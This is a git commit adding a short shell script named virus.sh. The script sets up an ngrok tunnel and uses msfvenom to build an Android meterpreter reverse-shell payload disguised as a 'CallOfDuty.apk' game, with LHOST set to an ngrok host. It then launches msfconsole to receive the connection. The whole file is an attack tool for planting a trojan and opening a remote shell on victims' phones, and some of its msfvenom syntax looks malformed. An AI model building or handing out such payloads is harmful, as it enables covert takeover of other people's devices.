36b498bc0b5c5369695d5b9886141e3660eaaca5
arduino90120 <60314719+arduino90120@users.noreply.github.com>
2022-05-10 19:17:39 +0200

    Add files via upload

---
+++ virus.sh
@@ -0,0 +1,7 @@
+sudo apt update && sudo apt upgrade
+sudo apt install -y adb apache2 
+sudo cp /sdcard/Download/ngrok /root
+cd /root
+bash ngrok tcp 8080
+msfvenom -p /android/meterpreter/reverse_tcp LHOST=6.tcp.ngrok.io LPORT=15298 /root <R CallOfDuty.apk
+msfconsole
